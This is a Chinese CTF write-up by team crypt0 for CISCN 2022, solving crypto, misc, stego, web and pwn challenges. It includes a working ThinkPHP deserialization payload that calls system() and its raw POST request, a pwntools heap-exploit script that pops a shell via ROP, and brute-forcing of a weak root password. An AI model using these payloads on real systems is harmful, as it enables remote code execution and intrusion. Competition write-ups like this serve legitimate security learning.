---
author: "Yiming Shen"
date: 2022-05-29
lastmod: 2022-05-29
title: "CISCN Crypt0 战队 WRITEUP"
tags: [
    "CTF",
    "WriteUP",
    "Web",
    "Note",
]
categories: [
    "Notes",
     "CTF",
]
math: true
typora-root-url: ..\..\..\..\static\
cover:
    image: "/CNSS%20Recruit-Web%20Write%20UP%20(copy).assets/%7D/crypt0-3.png" 
---



## 一、战队信息

**战队名称：** crypt0

**战队排名**：43

## 二、解题情况

![image-20220529200947359](/CiscnWP.assets/%7D/image-20220529200947359.png)

## 三、解题过程

###  1. 签到电台

#### 操作内容

根据信息查询电码得：

![image-20220529131719396](/CiscnWP.assets/%7D/image-20220529131719396.png)

1732 2514 1344 0356 0451 6671 0055

所给密码本前7*4位：

2596 1288 9021 9881 7176 6305 6302

模十算法计算结果：

3228 3792 0365 9137 7527 2976 6357

上传数据：

![image-20220529131525914](/CiscnWP.assets/%7D/image-20220529131525914.png)

![image-20220529112929847](/CiscnWP.assets/%7D/image-20220529112929847.png)



#### flag值：

```flag
flag{86e9206c-fb8a-487a-8c5e-0b60c5b40c93}
```

###  2. Ezpop

#### 操作内容

1. 进入网址，进行信息收集，发现`robots.txt`，无内容

2. dirsearch目录扫描

   `dirsearch -u http://eci-2ze2gn5mwurc7epmkty8.cloudeci1.ichunqiu.com/`

   ![image-20220529191648946](/CiscnWP.assets/%7D/image-20220529191648946.png)

   **发现敏感文件：`www.zip`**

3. 下载得到网站泄露的源代码

4. 从`/vendor/autoload.php` `www\app\controller\index.php`中发现入口是post数据a，根据题名可知是pop链的thinkphp框架反序列化，逐链寻找，得到入口

5. 构造反序列化对象

```json
O:17:"think\model\Pivot":9:{s:19:"think\Modelexists";b:1;s:18:"think\Modelforce";b:1;s:21:"think\ModellazySave";b:1;s:9:"*suffix";O:17:"think\model\Pivot":9:{s:19:"think\Modelexists";b:1;s:18:"think\Modelforce";b:1;s:21:"think\ModellazySave";b:1;s:9:"*suffix";s:0:"";s:17:"think\Modeldata";a:1:{s:4:"test";a:1:{s:4:"test";s:13:"cat+/flag.txt";}}s:21:"think\ModelwithAttr";a:1:{s:4:"test";a:1:{s:4:"test";s:6:"system";}}s:7:"*json";a:1:{i:0;s:4:"test";}s:12:"*jsonAssoc";b:1;s:12:"*withEvent";b:0;}s:17:"think\Modeldata";a:1:{s:4:"test";a:1:{s:4:"test";s:13:"cat+/flag*";}}s:21:"think\ModelwithAttr";a:1:{s:4:"test";a:1:{s:4:"test";s:6:"system";}}s:7:"*json";a:1:{i:0;s:4:"test";}s:12:"*jsonAssoc";b:1;s:12:"*withEvent";b:0;}
```

6. URL编码后post方法传入对象

![image-20220529134947949](/CiscnWP.assets/%7D/image-20220529134947949.png)

```
POST http://eci-2zeayc165jl9fdxb7ezz.cloudeci1.ichunqiu.com/index.php/index/test HTTP/1.1
Host: eci-2zeayc165jl9fdxb7ezz.cloudeci1.ichunqiu.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: ci_session=9bae6a3aa78f5d0b1d119d3803fc01d59d5ddba3; __jsluid_h=cb19eaa96eca8cfd4082513fec391da7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1377

a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A9%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A13%3A%22cat+%2Fflag.txt%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A4%3A%22test%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A13%3A%22cat+%2Fflag.txt%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A4%3A%22test%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D

```

#### flag值：

```flag
flag{656d09d3-60d4-4410-ba78-a743f97df418}
```

###  3. 基于挑战码的双向认证I和II

#### 操作内容(非预期解)

进入root用户目录，查看`start.sh`文件内容，发现flag目录，直接cat获得两题的flag。

![image-20220529131626726](/CiscnWP.assets/%7D/image-20220529131626726.png)

#### flag值：

```flag
flag{6cc71f34-faal-4827-8480-22dc3659d90c}
flag{34f5fdaf-c373-47fd-afab-01ed2914c1la}
```

###  4. 基于挑战码的双向认证III

#### 操作内容（非预期解）

![image-20220529193844607](/CiscnWP.assets/%7D/image-20220529193844607.png)

连入ssh后，尝试爆破root用户常见弱口令

尝试`toor`后，成功，获取root权限

![image-20220529194032607](/CiscnWP.assets/%7D/image-20220529194032607.png)

拿到flag

#### flag值：

```flag
flag{7b352ef0-1bb1-41af-a7d7-b74f62ff23f0}
```

###  5. ez_usb

#### 操作内容

1. 获取附件
2. 获取USB流量包

![image-20220529194423847](/CiscnWP.assets/%7D/image-20220529194423847.png)

将不同Source，Destination为host的流量包分开

![计算机生成了可选文字: #tong@ kali Is 2a11．pcapng 2a4．pcapng -hyperv 2a4a1 2a8a9 2a8a1 inN/miscl[18：49：15] ·pcapng ·pcapng ·pcapng ezusb.pcapng UsbKeyboarcNacker.py Ust*hc*acker.py](/CiscnWP.assets/%7D/clip_image001.png)

用下面提供的脚本对键盘按键进行分析

获取内容如下：

![计算机生成了可选文字: #tong@kali-hypervin•u/miscl[18：49：41] ，pythonUsbKeyboard4acker.py2a8a1．pcapng 刁UnknowKey： 刁UnknowKey。 刁UnknowKey：91 [刁UnknowKey：91 [+]Found 526172211a97e9〈CP>c〈CP>+987彐e9999 d99999999999999C4527424g4彐588彐e99999a2〈CP>a999999〈 CP>82b9f9bø5彐9778b5541d彐彐989a2e999999666C61672〈CP >e〈CP>747874〈CP>bgb〈CP>*I彐242f彐a〈CP>fc〈CP>e99 bß92c22gd6egg4167cø5〈CP>a7〈CP>8798b271f〈CP>fc〈C P>842ae彐d251e655彐6〈CP>fga〈CP>da87C774e6b67d9〈CP> e6彐16684766〈CP>a86e844d〈CP>[81aa2〈CP>C72C71彐48d1 ec4<CAP>c<DEL>3d7b<CAP>øuøø7øø #tong@kali-hypervinN/miscl[18：：2彐] ，pythonUsbKeyboarcNacker.py2a1øa1.pcapng [+]Found：彐5C5彐5765e5ea74a #tong@kali-hypervinN/miscl[18：．49]](/CiscnWP.assets/%7D/clip_image001-16538246887091.png)

其中分别为RAR文件与其解压密码

解压后文件可得

Flag：

```
flag{20de17cc-d2c1-4b61-bebd-41159ed7172d}
```

#### 脚本代码

```python
#!/usr/bin/env python
import sys
import os
DataFileName = "usb.dat"
presses = []
normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}
def main():
    # check argv
    if len(sys.argv) != 2:
        print("Usage : ")
        print("        python UsbKeyboardHacker.py data.pcap")
        print("Tips : ")
        print("        To use this python script , you must install the tshark first.")
        print("        You can use `sudo apt-get install tshark` to install it")
        print("Author : ")
        print("        WangYihang <wangyihanger@gmail.com>")
        print("        If you have any questions , please contact me by email.")
        print("        Thank you for using.")
        exit(1)
    # get argv
    pcapFilePath = sys.argv[1]
    
    # get data of pcap
    os.system("tshark -r %s -T fields -e usb.capdata 'usb.data_len == 8' > %s" % (pcapFilePath, DataFileName))
    # read data
    with open(DataFileName, "r") as f:
        for line in f:
            presses.append(line[0:-1])
    # handle
    result = ""
    for press in presses:
        if press == '':
            continue
        if ':' in press:
            Bytes = press.split(":")
        else:
            Bytes = [press[i:i+2] for i in range(0, len(press), 2)]
        if Bytes[0] == "00":
            if Bytes[2] != "00" and normalKeys.get(Bytes[2]):
                result += normalKeys[Bytes[2]]
        elif int(Bytes[0],16) & 0b10 or int(Bytes[0],16) & 0b100000: # shift key is pressed.
            if Bytes[2] != "00" and normalKeys.get(Bytes[2]):
                result += shiftKeys[Bytes[2]]
        else:
            print("[-] Unknow Key : %s" % (Bytes[0]))
    print("[+] Found : %s" % (result))
    # clean the temp data
    os.system("rm ./%s" % (DataFileName))
 
if __name__ == "__main__":
    main()

```



###  6. baby_tree

#### 操作内容

分析给出的ast树，推出加密算法

```python
def encodeing(e, Val):
    b = list(e)
    k = list(Val)
    for i in range(39):
        r0,r1,r2,r3 = b[i],b[i+1],b[i+2],b[i+3]
        b[i+0]= r2^((k[0] +(r0 >>4)) & 0xff)
        b[i+1] = r3((k[1] +(r1 >>2)) & 0xff)
        b[i+2]= r0^ k[2]
        b[i+3] = r1^ k[3]
        k[0],k[1],k[2],k[3]= k[1],k[2],k[3],k[0]
    return b
```

根据该算法，推出以下解密代码，计算b值，得到flag

![image-20220529195925983](/CiscnWP.assets/%7D/image-20220529195925983.png)

#### *脚本代码

```python
k = list(b'y345')
Bytes= [88, 35, 88, 225, 7, 201, 57, 94, 77, 56, 75, 168, 72, 218, 64, 91, 16, 101, 32, 207, 73, 130, 74, 128, 76, 201, 16, 248, 41, 205, 103, 84, 91, 99, 79, 202, 22, 131, 63, 255, 20, 16]
for i in range(38, -1, -1):
    k[0], k[1], k[2], k[3] = k[3], k[0], k[1], k[2]
    r1 = Bytes[i+3] ^ k[3]
    r0 = Bytes[i+2] ^ k[2]
    r3 = Bytes[i+1] ^ ((k[1] + (r1 >> 2)) & 0xff)
    r2 = Bytes[i] ^ ((k[0] + (r0 >> 4)) & 0xff)
    Bytes[i], Bytes[i+1], Bytes[i+2], Bytes[i+3] = r0, r1, r2, r3
print(bytes(Bytes))
```

#### flag值：

```flag
flag{30831242-56db-45b4-96fd-1f47e60da99d}
```

###  7. everlasting_night

#### 操作内容

1. 下载附件

2. 获取png图片

3. 使用HxD Hex Editor发现png文件尾异常

   ![image-20220529200217390](/CiscnWP.assets/%7D/image-20220529200217390.png)

正好多出32位数据

```md5
FB 3E FC E4 CE AC 2F 54 45 C7 AE 17 E3 E9 69 AB
```

猜测是md5值，进行撞库

![image-20220529200256888](/CiscnWP.assets/%7D/image-20220529200256888.png)

字符串：`ohhWh04m1`

加上后补充的提示使用LSB隐写

使用https://github.com/livz/cloacked-pixel中脚本与上文密码进行解密

![image-20220529205557072](/CiscnWP.assets/%7D/image-20220529205557072.png)

解密得到的压缩包，密码就是上面的字符串，获得flag的变形图片，打开photoshop对其进行变形位移调整

![image-20220529200432912](/CiscnWP.assets/%7D/image-20220529200432912.png)



#### flag值：

```flag
flag{607f41da-e849-4c0b-8867-1b3c74536cc4}
```

###  8. newest_note

nc连接后，根据附件，编写相应脚本，执行后可得flag

#### 脚本代码

```python
from pwn import *

p = process("./pwn")
libc = ELF('./libc.so.6')
def add(i, data="aaaaaaaa"):
    p.recvuntil(': ')
    p.sendline("1")
    p.recvuntil(': ')
    p.sendline(str(i))
    p.recvuntil(': ')
    p.send(data)
def dele(i):
    p.recvuntil(': ')
    p.sendline("2")
    p.recvuntil(': ')
    p.sendline(str(i))

def show(i):
    p.recvuntil(': ')
    p.sendline("3")
    p.recvuntil(': ')
    p.sendline(str(i))
    p.recvuntil("Content: ")
    m = p.recvline()
    return u64(m[:-1].ljust(8,b'\x00'))


if __name__ == '__main__':
    # 先泄露堆地址
    booksize = 0x1fffffff + 0xa0
    p.recvuntil("will be? :")
    p.sendline(str(booksize)) # malloc 0x500
    add(0)
    add(1)
    add(2)
    add(3)
    dele(0)
    m = show(0)
    heap_base = m << 12
    print("heap==>", hex(heap_base))
    # 构造tcache bin链
    dele(1)
    dele(2)
    dele(3)
    # 修改标志位，就可以继续删除
    add(0xa9)
    dele(1)
    # 分配到最上面
    add(4, p64((heap_base >> 12) ^ (heap_base + 0x2a0)))
    add(5)
    add(6)
    add(7)
    dele(7)

    # 泄露libc地址
    libc_base = show(7) - 0x218cc0
    print('libc_base==>', hex(libc_base))
    # 泄露堆栈地址
    env = libc.sym['environ']
    add(20, p64(libc_base+env)*0x4)
    stack_addr = show(0x0)
    print('stack==>', hex(stack_addr))
    payload = p64(heap_base+0x300)+p64(0x41)+p64(0x1000)+p64(0x41)+p64(0)*2
    add(0, payload)

    payload = p64(0) + p64(0x41) + p64(0x1000) + p64(0x41) + p64(0) + p64(0)
    add(1, payload)
    add(2)
    add(3)
    dele(3)
    dele(1)
    dele(8)
    # rop
    payload = b'a' * 0x20+p64((heap_base >> 12) ^ (stack_addr - 0x1a8+0x50))
    add(0, payload)
    add(0)
    binsh = libc.search(b'/bin/sh').__next__()
    sys = libc.sym['system']
    payload = p64(0) + p64(libc_base+0x02e6c5)+p64(libc_base + binsh) 
    payload += p64(libc_base + 0x02d9b9) + p64(libc_base + sys)
    add(0,payload)

    p.interactive()
```

#### flag值：

```flag
flag{6c9d1e47-1611-4b5f-9890-5f988b0c3fcc}
```





















